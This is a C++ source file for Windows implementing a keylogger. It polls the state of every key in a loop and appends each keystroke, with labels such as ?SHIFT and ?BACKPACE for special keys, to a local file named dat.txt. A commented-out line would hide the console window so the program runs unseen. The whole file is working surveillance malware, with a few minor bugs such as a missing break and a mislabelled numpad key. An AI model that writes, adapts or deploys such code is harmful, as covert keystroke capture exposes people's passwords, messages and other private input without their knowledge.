#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>



using namespace std;



void LOG(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open()) {
		LogFile << input;
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {

    // handle special keys
    // https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
	switch (S_Key) {

	    case VK_RBUTTON:
            LOG("?RCLICK");

        case VK_CANCEL:
            LOG("?CANCEL");
            return true;

        case VK_BACK:
            // LOG("\b");
            LOG("?BACKPACE");
            return true;

        case VK_TAB:
            LOG("?TAB");
            return true;

        case VK_CLEAR:
            LOG("?CLEAR");
            return true;

        case VK_RETURN:
            LOG("\n");
            // LOG("?ENTER");
            return true;

        case VK_SHIFT:
            LOG("?SHIFT");
            return true;

        case VK_CONTROL:
            LOG("?CTRL");
            return true;

        case VK_MENU:
            LOG("?ALT");
            return true;

        case VK_PAUSE:
            LOG("?PAUSE");
            return true;

        case VK_CAPITAL:
            LOG("?CAPSLOCK");
            return true;

        // IME Stuff - from 0x16 to 0x1A

        case VK_ESCAPE:
            LOG("?ESC");
            return true;

        // IME Stuff - from 0x1C to 0x1F

        case VK_SPACE:
            LOG("?SPACE");
            return true;

        case VK_PRIOR:
            LOG("?PAGEUP");
            return true;

        case VK_NEXT:
            LOG("?PAGEDOWN");
            return true;

        case VK_END:
            LOG("?END");
            return true;

        case VK_HOME:
            LOG("?HOME");
            return true;

        case VK_LEFT:
            LOG("?ARROWLEFT");
            return true;

        case VK_UP:
            LOG("?ARROWUP");
            return true;

        case VK_RIGHT:
            LOG("?ARROWRIGHT");
            return true;

        case VK_DOWN:
            LOG("?ARROWDOWN");
            return true;

        case VK_SELECT:
            LOG("?SELECT");
            return true;

        case VK_PRINT:
            LOG("?PRINT");
            return true;

        case VK_EXECUTE:
            LOG("?EXECUTE");
            return true;

        case VK_SNAPSHOT:
            LOG("?PRINTSCREEN");
            return true;

        case VK_INSERT:
            LOG("?INSERT");
            return true;

        case VK_DELETE:
            LOG("?DELETE");
            return true;

        case VK_HELP:
            LOG("?HELP");
            return true;

        case VK_LWIN:
            LOG("?WINLEFT");
            return true;

        case VK_RWIN:
            LOG("?WINRIGHT");
            return true;

        case VK_APPS:
            LOG("?APPS");
            return true;

        case VK_SLEEP:
            LOG("?SLEEP");
            return true;

        case VK_NUMPAD0:
            LOG("?NUM0");
            return true;

        case VK_NUMPAD1:
            LOG("?NUM1");
            return true;

        case VK_NUMPAD2:
            LOG("?NUM2");
            return true;

        case VK_NUMPAD3:
            LOG("?NUM3");
            return true;

        case VK_NUMPAD4:
            LOG("?NUM4");
            return true;

        case VK_NUMPAD5:
            LOG("?NUM6");
            return true;

        case VK_NUMPAD6:
            LOG("?NUM6");
            return true;

        case VK_NUMPAD7:
            LOG("?NUM7");
            return true;

        case VK_NUMPAD8:
            LOG("?NUM8");
            return true;

        case VK_NUMPAD9:
            LOG("?NUM9");
            return true;

        case VK_MULTIPLY:
            LOG("*");
            return true;

        case VK_ADD:
            LOG("+");
            return true;

        case VK_SEPARATOR:
            LOG("?SEPERATOR");
            return true;

        case VK_SUBTRACT:
            LOG("-");
            return true;

        case VK_DECIMAL:
            LOG(".");
            return true;

        case VK_DIVIDE:
            LOG("/");
            return true;

        case VK_F1:
            LOG("?F1");
            return true;


        case '¾':
            LOG(".");
            return true;


        default:
            return false;
	}
}

int main()
{
	// ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(5);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("dat.txt", fstream::app);
					if (LogFile.is_open()) {
						LogFile << char(KEY);
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
